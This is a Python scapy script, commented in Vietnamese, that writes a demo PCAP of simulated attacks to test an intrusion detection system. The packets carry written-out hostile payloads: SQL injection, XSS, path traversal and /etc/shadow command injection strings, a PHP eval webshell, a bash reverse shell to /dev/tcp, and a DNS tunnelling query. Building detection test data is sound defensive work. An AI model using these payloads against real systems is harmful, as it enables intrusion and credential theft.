"""
Script tạo file PCAP mẫu chứa các gói tin tấn công giả lập.
Dùng cho demo NIDS ở chế độ offline.

Chạy: python create_demo_pcap.py
Output: pcap_samples/demo_attacks.pcap
"""
from scapy.all import IP, TCP, UDP, ICMP, Raw, wrpcap, Ether
import logging
import os

from config.logger import setup_logging

logger = logging.getLogger("nids.pcap")

OUTPUT_DIR = "pcap_samples"
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "demo_attacks.pcap")

os.makedirs(OUTPUT_DIR, exist_ok=True)

packets = []

# 1. SQL INJECTION ATTACKS

# SID:1000001 - UNION SELECT
sqli_union = (
    IP(src="192.168.1.100", dst="10.0.0.5")
    / TCP(sport=54321, dport=80, flags="PA", seq=1000, ack=1)
    / Raw(load=b"GET /search?q=1'+UNION+SELECT+username,password+FROM+users-- HTTP/1.1\r\nHost: victim.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n")
)
packets.append(sqli_union)

# SID:1000002 - OR boolean bypass
sqli_or = (
    IP(src="192.168.1.100", dst="10.0.0.5")
    / TCP(sport=54322, dport=80, flags="PA", seq=2000, ack=1)
    / Raw(load=b"GET /login?user=admin'+or+'1'%3D'1 HTTP/1.1\r\nHost: victim.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n")
)
packets.append(sqli_or)

# SID:1000003 - SQL comment (--)
sqli_comment = (
    IP(src="192.168.1.100", dst="10.0.0.5")
    / TCP(sport=54323, dport=80, flags="PA", seq=3000, ack=1)
    / Raw(load=b"GET /page?id=1-- HTTP/1.1\r\nHost: victim.com\r\n\r\n")
)
packets.append(sqli_comment)

# 2. CROSS-SITE SCRIPTING (XSS)

# SID:1000010 - <script> tag
xss_script = (
    IP(src="192.168.1.101", dst="10.0.0.5")
    / TCP(sport=54330, dport=80, flags="PA", seq=4000, ack=1)
    / Raw(load=b"GET /comment?text=<script>alert('XSS')</script> HTTP/1.1\r\nHost: victim.com\r\n\r\n")
)
packets.append(xss_script)

# SID:1000011 - javascript: URI
xss_js = (
    IP(src="192.168.1.101", dst="10.0.0.5")
    / TCP(sport=54331, dport=80, flags="PA", seq=5000, ack=1)
    / Raw(load=b"GET /redirect?url=javascript:alert(document.cookie) HTTP/1.1\r\nHost: victim.com\r\n\r\n")
)
packets.append(xss_js)

# SID:1000012 - Event handler (POST body)
xss_event = (
    IP(src="192.168.1.101", dst="10.0.0.5")
    / TCP(sport=54332, dport=80, flags="PA", seq=6000, ack=1)
    / Raw(load=b"POST /api/comment HTTP/1.1\r\nHost: victim.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 35\r\n\r\nbody=<img src=x onerror=alert(1)>")
)
packets.append(xss_event)

# 3. PATH TRAVERSAL / LFI
# SID:1000020 - ../
path_traversal = (
    IP(src="192.168.1.102", dst="10.0.0.5")
    / TCP(sport=54340, dport=80, flags="PA", seq=7000, ack=1)
    / Raw(load=b"GET /file?path=../../../../etc/passwd HTTP/1.1\r\nHost: victim.com\r\n\r\n")
)
packets.append(path_traversal)

# SID:1000021 - /etc/passwd
lfi_passwd = (
    IP(src="192.168.1.102", dst="10.0.0.5")
    / TCP(sport=54341, dport=80, flags="PA", seq=8000, ack=1)
    / Raw(load=b"GET /download?file=/etc/passwd HTTP/1.1\r\nHost: victim.com\r\n\r\n")
)
packets.append(lfi_passwd)

# SID:1000022 - win.ini
lfi_winini = (
    IP(src="192.168.1.102", dst="10.0.0.5")
    / TCP(sport=54342, dport=8080, flags="PA", seq=9000, ack=1)
    / Raw(load=b"GET /download?file=C:\\windows\\win.ini HTTP/1.1\r\nHost: victim.com\r\n\r\n")
)
packets.append(lfi_winini)

# 4. COMMAND INJECTION (RCE)

# SID:1000030 - Chained commands
cmd_inject = (
    IP(src="192.168.1.103", dst="10.0.0.5")
    / TCP(sport=54350, dport=80, flags="PA", seq=10000, ack=1)
    / Raw(load=b"GET /ping?host=127.0.0.1;cat+/etc/shadow HTTP/1.1\r\nHost: victim.com\r\n\r\n")
)
packets.append(cmd_inject)

# 5. NETWORK SCANS (NMAP)

# SID:1000100 - Nmap Xmas Scan (FIN + URG + PSH)
xmas_scan = (
    IP(src="192.168.1.200", dst="10.0.0.5")
    / TCP(sport=12345, dport=80, flags="FPU", seq=0)
)
packets.append(xmas_scan)

# SID:1000101 - Nmap Null Scan (no flags)
null_scan = (
    IP(src="192.168.1.200", dst="10.0.0.5")
    / TCP(sport=12346, dport=443, flags="", seq=0)
)
packets.append(null_scan)

# SID:1000102 - Nmap FIN Scan
fin_scan = (
    IP(src="192.168.1.200", dst="10.0.0.5")
    / TCP(sport=12347, dport=22, flags="F", seq=0)
)
packets.append(fin_scan)

# SID:1000103 - SYN-FIN anomaly
synfin = (
    IP(src="192.168.1.200", dst="10.0.0.5")
    / TCP(sport=12348, dport=8080, flags="SF", seq=0)
)
packets.append(synfin)

# 6. DENIAL OF SERVICE (DOS)

# SID:1000201 - SYN Flood (detection_filter: > 10 SYN toi cung dich trong 1 giay)
for i in range(12):
    syn_flood = (
        IP(src="192.168.1.210", dst="10.0.0.5")
        / TCP(sport=33445 + i, dport=80, flags="S", seq=1)
    )
    packets.append(syn_flood)

# SID:1000202 - Slowloris HTTP header probe
slowloris = (
    IP(src="192.168.1.211", dst="10.0.0.5")
    / TCP(sport=33446, dport=80, flags="PA", seq=1, ack=1)
    / Raw(load=b"GET / HTTP/1.1\r\nHost: victim.com\r\nX-a: b\r\n\r\n")
)
packets.append(slowloris)

# SID:1000203 - Large ICMP echo request (dsize > 800)
icmp_pod = (
    IP(src="192.168.1.212", dst="10.0.0.5")
    / ICMP(type=8, code=0)
    / Raw(load=b"A" * 1000)
)
packets.append(icmp_pod)

# 7. BRUTE FORCE & CREDENTIAL ATTACKS

# SID:1000301 - SSH probe
ssh_probe = (
    IP(src="192.168.1.220", dst="10.0.0.5")
    / TCP(sport=44551, dport=22, flags="PA", seq=1, ack=1)
    / Raw(load=b"SSH-2.0-OpenSSH_8.9\r\n")
)
packets.append(ssh_probe)

# SID:1000302 - FTP anonymous
ftp_probe = (
    IP(src="192.168.1.221", dst="10.0.0.5")
    / TCP(sport=44552, dport=21, flags="PA", seq=1, ack=1)
    / Raw(load=b"USER anonymous\r\n")
)
packets.append(ftp_probe)

# 8. MALWARE & C2 ACTIVITY

# SID:1000401 - PHP Webshell
webshell = (
    IP(src="192.168.1.230", dst="10.0.0.5")
    / TCP(sport=55661, dport=80, flags="PA", seq=1, ack=1)
    / Raw(load=b"POST /shell.php HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 46\r\n\r\n<?php eval(base64_decode('cGhwaW5mbygpOw==')); ?>")
)
packets.append(webshell)

# SID:1000402 - Reverse shell
rev_shell = (
    IP(src="192.168.1.231", dst="10.0.0.5")
    / TCP(sport=4444, dport=4444, flags="PA", seq=1, ack=1)
    / Raw(load=b"/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
)
packets.append(rev_shell)

# SID:1000404 - SQLMap User-Agent
sqlmap_ua = (
    IP(src="192.168.1.232", dst="10.0.0.5")
    / TCP(sport=55662, dport=80, flags="PA", seq=1, ack=1)
    / Raw(load=b"GET / HTTP/1.1\r\nHost: victim.com\r\nUser-Agent: sqlmap/1.7#stable\r\n\r\n")
)
packets.append(sqlmap_ua)

# 9. RECONNAISSANCE (UDP & ICMP)

# SID:1000501 - SNMP public community probe
snmp_probe = (
    IP(src="192.168.1.240", dst="10.0.0.5")
    / UDP(sport=60111, dport=161)
    / Raw(load=b"\x30\x29\x02\x01\x01\x04\x06public\xa0")
)
packets.append(snmp_probe)

# SID:1000502 - DNS Tunneling query
dns_tunnel = (
    IP(src="192.168.1.241", dst="10.0.0.5")
    / UDP(sport=60112, dport=53)
    / Raw(load=b"\x00\x01\x01\x00\x00\x01\x07exfil01\x08c2tunnel\x02io\x00")
)
packets.append(dns_tunnel)

# 10. NORMAL TRAFFIC 

# HTTP GET bình thường
normal_http = (
    IP(src="192.168.1.50", dst="10.0.0.5")
    / TCP(sport=60000, dport=80, flags="PA", seq=100, ack=1)
    / Raw(load=b"GET /index.html HTTP/1.1\r\nHost: victim.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n")
)
packets.append(normal_http)

# DNS query (UDP)
dns_query = (
    IP(src="192.168.1.50", dst="8.8.8.8")
    / UDP(sport=55555, dport=53)
    / Raw(load=b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01")
)
packets.append(dns_query)

# ICMP Ping bình thường
ping = (
    IP(src="192.168.1.50", dst="10.0.0.5")
    / ICMP(type=8, code=0)
    / Raw(load=b"PingPingPingPing")
)
packets.append(ping)

# Normal TCP SYN (kết nối bình thường)
normal_syn = (
    IP(src="192.168.1.50", dst="10.0.0.5")
    / TCP(sport=60001, dport=443, flags="S", seq=500)
)
packets.append(normal_syn)

# GHI RA FILE PCAP
wrpcap(OUTPUT_FILE, packets)
setup_logging("INFO")
logger.info("Đã tạo %d gói tin vào %s", len(packets), OUTPUT_FILE)
logger.info("  - 10 gói tấn công web (SQLi, XSS, Path Traversal, CMD Injection)")
logger.info("  -  4 gói network scan (Xmas, Null, FIN, SYN-FIN)")
logger.info("  - 14 gói DoS (12 SYN Flood, Slowloris, ICMP Oversized)")
logger.info("  -  2 gói Brute-force (SSH probe, FTP anonymous)")
logger.info("  -  3 gói Malware/C2 (Webshell, Reverse shell, Sqlmap User-Agent)")
logger.info("  -  2 gói UDP/ICMP Recon (SNMP public, DNS tunneling)")
logger.info("  -  4 gói traffic bình thường (HTTP, DNS, ICMP, SYN)")
logger.info("Để chạy NIDS phân tích file này: python main.py")
